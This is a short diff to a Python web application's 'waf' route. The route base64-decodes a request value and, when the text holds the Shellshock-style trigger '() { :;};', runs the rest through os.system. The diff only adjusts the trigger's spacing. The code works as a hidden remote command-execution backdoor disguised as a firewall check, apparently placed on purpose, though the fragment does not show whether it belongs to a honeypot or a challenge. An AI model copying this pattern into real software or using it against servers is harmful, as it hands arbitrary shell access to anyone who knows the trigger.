@@ -717,8 +717,8 @@ def waf():
         wordd = (base64.b64decode(wordd)).decode("utf-8")
     except:
         return render_template('b64error.html')
-    if "() { :; };" in wordd:
-        os.system(wordd.replace("() { :; };", ""))
+    if "() { :;};" in wordd:
+        os.system(wordd.replace("() { :;};", ""))
     return render_template('waf.html')
 
 
